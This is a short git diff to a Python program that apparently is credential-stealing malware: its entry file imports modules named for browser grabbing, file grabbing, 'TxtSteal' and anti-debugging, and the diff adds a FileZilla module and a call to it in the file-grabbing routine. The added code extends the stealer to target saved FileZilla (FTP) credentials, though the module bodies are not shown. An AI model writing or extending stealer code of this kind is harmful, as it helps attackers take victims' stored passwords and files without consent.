@@ -34,6 +34,7 @@ from browsers import browsers
 from files import Files_txt
 from files import file_grubber
 from secure import antiDebug
+from files import filezilla
 
 def Start() -> None:
     if not config.Config.debuging:
@@ -44,6 +45,7 @@ def GrubFiles() -> None:
         config.Config.dataForMassageFiles= file_grubber.Grab(config.Config.dataForMassageFiles)
     else:
         Files_txt.TxtSteal()
+    filezilla.FileZilla()
 
 def Browsers() -> None:
     browsers.Browsers()
